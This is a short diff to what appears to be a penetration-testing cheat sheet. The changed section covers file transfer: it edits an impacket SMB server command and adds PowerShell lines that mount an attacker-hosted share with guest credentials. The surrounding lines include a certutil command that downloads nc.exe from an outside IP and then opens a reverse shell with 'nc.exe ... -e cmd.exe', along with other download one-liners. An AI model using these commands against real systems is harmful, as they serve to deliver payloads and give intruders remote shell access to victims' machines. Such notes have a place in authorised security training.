@@ -326,7 +326,7 @@ FILE TRANSFER
        •  python -m SimpleHTTPServer 80
        •  python -m pyftpdlib -p 21 -w -d /tmp
        •  ptftpd -p 69  -v eth0 /tmp
-       •  impacket-smbserver share /mySharedFolder          // Creates smb share on your machine. Might need -smb2support option
+       •  impacket-smbserver -username guest -password guest -smb2support  share  $(pwd) //  Might need to remove -smb2support option
 
     Tools:
        •  Linux & Windows ( Newer Windows versions only )
@@ -335,6 +335,9 @@ FILE TRANSFER
        • Windows ( Should work on most Windows versions)
              ▪powershell (New-Object System.Net.WebClient).DownloadFile("https://10.10.10.144/test.txt", "test.txt")
              ▪net use Z: \\computer_name\share_name    //Mount smb share
+             ▪$pass= "guest" | ConvertTo-SecureString -AsPlainText -Force
+              $cred = New-Object System.Managment.Automation.PsCredential('guest',$pass)
+              New-PSDrive -name guest -root \\10.10.15.53\share -Credential $cred -PSProvider "filesystem"
              ▪certutil.exe -urlcache -split -f "http://10.11.0.106:8000/nc.exe" nc.exe && nc.exe -nv 10.11.0.106 443 -e cmd.exe
              ▪VBscript
                     → echo strUrl = WScript.Arguments.Item(0) > wget.vbs
